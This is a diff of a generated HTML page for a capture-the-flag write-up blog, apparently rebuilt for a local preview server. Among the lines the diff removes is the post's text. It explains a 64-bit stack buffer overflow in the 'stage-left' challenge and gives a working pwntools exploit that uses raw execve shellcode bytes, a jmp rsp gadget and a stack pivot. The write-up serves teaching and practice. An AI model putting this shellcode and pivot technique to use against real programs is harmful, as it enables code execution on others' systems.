@@ -1,25 +1,25 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><meta charset="utf-8">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="index, follow">
+<meta name="robots" content="noindex, nofollow">
 <title>JerseyCTF 2024 - pwn/stage-left | CTF Writeups</title>
 <meta name="keywords" content="">
 <meta name="description" content="This challenge is very similar to the last challenge Running on Prayers, except instead of an unbounded gets into a buffer, we read in 0x40 bytes using fgets. Because space is limited, we have to inject our shellcode in stages, as the name suggets.
 undefined8 vuln(void) { char local_28 [32]; printf(&#34;Cramped...&#34;); fgets(local_28,0x40,stdin); return 0; } Again we can use jmp rsp, but this time we will use somthing like sub rsp, 0x20 jmp rsp after rsp.">
 <meta name="author" content="">
-<link rel="canonical" href="https://dfoudeh.github.io/posts/jersey-ctf-2024-stage-left/">
+<link rel="canonical" href="http://localhost:1313/posts/jersey-ctf-2024-stage-left/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.287d23ee212a39f1ca2dfc362a4cfcc63951b52b214116e1cb5663bb1883333a.css" integrity="sha256-KH0j7iEqOfHKLfw2Kkz8xjlRtSshQRbhy1ZjuxiDMzo=" rel="preload stylesheet" as="style">
-<link rel="icon" href="https://dfoudeh.github.io/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="https://dfoudeh.github.io/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="https://dfoudeh.github.io/favicon-32x32.png">
-<link rel="apple-touch-icon" href="https://dfoudeh.github.io/apple-touch-icon.png">
-<link rel="mask-icon" href="https://dfoudeh.github.io/safari-pinned-tab.svg">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="https://dfoudeh.github.io/posts/jersey-ctf-2024-stage-left/">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/jersey-ctf-2024-stage-left/">
 <noscript>
     <style>
         #theme-toggle,
@@ -56,69 +56,7 @@ undefined8 vuln(void) { char local_28 [32]; printf(&#34;Cramped...&#34;); fgets(
         }
 
     </style>
-</noscript><meta property="og:title" content="JerseyCTF 2024 - pwn/stage-left" />
-<meta property="og:description" content="This challenge is very similar to the last challenge Running on Prayers, except instead of an unbounded gets into a buffer, we read in 0x40 bytes using fgets. Because space is limited, we have to inject our shellcode in stages, as the name suggets.
-undefined8 vuln(void) { char local_28 [32]; printf(&#34;Cramped...&#34;); fgets(local_28,0x40,stdin); return 0; } Again we can use jmp rsp, but this time we will use somthing like sub rsp, 0x20 jmp rsp after rsp." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://dfoudeh.github.io/posts/jersey-ctf-2024-stage-left/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2024-03-24T18:52:00-04:00" />
-<meta property="article:modified_time" content="2024-03-24T18:52:00-04:00" />
-
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="JerseyCTF 2024 - pwn/stage-left"/>
-<meta name="twitter:description" content="This challenge is very similar to the last challenge Running on Prayers, except instead of an unbounded gets into a buffer, we read in 0x40 bytes using fgets. Because space is limited, we have to inject our shellcode in stages, as the name suggets.
-undefined8 vuln(void) { char local_28 [32]; printf(&#34;Cramped...&#34;); fgets(local_28,0x40,stdin); return 0; } Again we can use jmp rsp, but this time we will use somthing like sub rsp, 0x20 jmp rsp after rsp."/>
-
-
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BreadcrumbList",
-  "itemListElement": [
-    {
-      "@type": "ListItem",
-      "position":  1 ,
-      "name": "Posts",
-      "item": "https://dfoudeh.github.io/posts/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  2 ,
-      "name": "JerseyCTF 2024 - pwn/stage-left",
-      "item": "https://dfoudeh.github.io/posts/jersey-ctf-2024-stage-left/"
-    }
-  ]
-}
-</script>
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BlogPosting",
-  "headline": "JerseyCTF 2024 - pwn/stage-left",
-  "name": "JerseyCTF 2024 - pwn\/stage-left",
-  "description": "This challenge is very similar to the last challenge Running on Prayers, except instead of an unbounded gets into a buffer, we read in 0x40 bytes using fgets. Because space is limited, we have to inject our shellcode in stages, as the name suggets.\nundefined8 vuln(void) { char local_28 [32]; printf(\u0026#34;Cramped...\u0026#34;); fgets(local_28,0x40,stdin); return 0; } Again we can use jmp rsp, but this time we will use somthing like sub rsp, 0x20 jmp rsp after rsp.",
-  "keywords": [
-    
-  ],
-  "articleBody": "This challenge is very similar to the last challenge Running on Prayers, except instead of an unbounded gets into a buffer, we read in 0x40 bytes using fgets. Because space is limited, we have to inject our shellcode in stages, as the name suggets.\nundefined8 vuln(void) { char local_28 [32]; printf(\"Cramped...\"); fgets(local_28,0x40,stdin); return 0; } Again we can use jmp rsp, but this time we will use somthing like sub rsp, 0x20 jmp rsp after rsp. 0x20 is just a placeholder, but it represents the offset between rsp and the start of the buffer. We will load our shellcode at the start of the buffer, and then calculte the offset between the start of the buffer and rsp. Using this, we jump back to the start of the buffer and execute our shellcode. I used the placeholder value, and using gdb, set a breakpoint on ret, and continued to when jmp rsp is called. The difference between the start of our buffer (which I filled with ‘AAAA’ for debugging) and rsp will be the offset we need.\n0x401232 in al, dx 0x401233 adc BYTE PTR [rsi-0x39], ah 0x401236 rex.RB (bad) → 0x401238 jmp rsp 0x40123a lea rax, [rip+0xdd7] # 0x402018 0x401241 mov rdi, rax 0x401244 mov eax, 0x0 0x401249 call 0x401060 0x40124e mov eax, 0xffffffff gef➤ search-pattern(\"AAAA\") [+] Searching '(AAAA)' in memory [+] In '[stack]'(0x7fff3aca9000-0x7fff3acca000), permission=rwx 0x7fff3acc7370 - 0x7fff3acc7376 → \"(AAAA)[...]\" 0x7fff3acc7374 - 0x7fff3acc737a → \"(AAAA)[...]\" 0x7fff3acc7378 - 0x7fff3acc737e → \"(AAAA)[...]\" 0x7fff3acc737c - 0x7fff3acc7382 → \"(AAAA)[...]\" 0x7fff3acc7380 - 0x7fff3acc7386 → \"(AAAA)[...]\" 0x7fff3acc7384 - 0x7fff3acc738a → \"(AAAA)[...]\" 0x7fff3acc7388 - 0x7fff3acc738e → \"(AAAA)[...]\" 0x7fff3acc738c - 0x7fff3acc7392 → \"(AAAA)[...]\" 0x7fff3acc7390 - 0x7fff3acc7396 → \"(AAAA)[...]\" 0x7fff3acc7394 - 0x7fff3acc739a → \"(AAAA)[...]\" i r rsp rsp 0x7fff3acc73a0 0x7fff3acc73a0 \u003e\u003e\u003e 0x7fff3acc73a0 - 0x7fff3acc7370 48 So 48 is the offset we need to pivot back to our shellcode. I think the shellcode generated by pwntools shellcraft would have been too long, so i found a shorter 27 byte shellcode on https://shell-storm.org/shellcode/index.html. Now putting it all together:\nfrom pwn import * elf = context.binary = ELF(\"./StageLeft\") target = process(\"./StageLeft\") jmp_rsp = next(elf.search(asm('jmp rsp'))) payload = b\"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\" payload += b\"\\x00\" * 13 payload += p64(jmp_rsp) payload += asm(''' sub rsp, 48; jmp rsp; ''') target.sendlineafter(\"...\", payload) target.interactive() ",
-  "wordCount" : "377",
-  "inLanguage": "en",
-  "datePublished": "2024-03-24T18:52:00-04:00",
-  "dateModified": "2024-03-24T18:52:00-04:00",
-  "mainEntityOfPage": {
-    "@type": "WebPage",
-    "@id": "https://dfoudeh.github.io/posts/jersey-ctf-2024-stage-left/"
-  },
-  "publisher": {
-    "@type": "Organization",
-    "name": "CTF Writeups",
-    "logo": {
-      "@type": "ImageObject",
-      "url": "https://dfoudeh.github.io/favicon.ico"
-    }
-  }
-}
-</script>
+</noscript>
 </head>
 
 <body class="" id="top">
@@ -136,7 +74,7 @@ undefined8 vuln(void) { char local_28 [32]; printf(&#34;Cramped...&#34;); fgets(
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="https://dfoudeh.github.io/" accesskey="h" title="CTF Writeups (Alt + H)">CTF Writeups</a>
+            <a href="http://localhost:1313/" accesskey="h" title="CTF Writeups (Alt + H)">CTF Writeups</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -158,8 +96,6 @@ undefined8 vuln(void) { char local_28 [32]; printf(&#34;Cramped...&#34;); fgets(
                         <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                     </svg>
                 </button>
-                <ul class="lang-switch"><li>|</li>
-                </ul>
             </div>
         </div>
         <ul id="menu">
@@ -249,7 +185,7 @@ after rsp. 0x20 is just a placeholder, but it represents the offset between rsp 
     </main>
     
 <footer class="footer">
-    <span>&copy; 2025 <a href="https://dfoudeh.github.io/">CTF Writeups</a></span>
+    <span>&copy; 2025 <a href="http://localhost:1313/">CTF Writeups</a></span>
     <span>
         Powered by
         <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
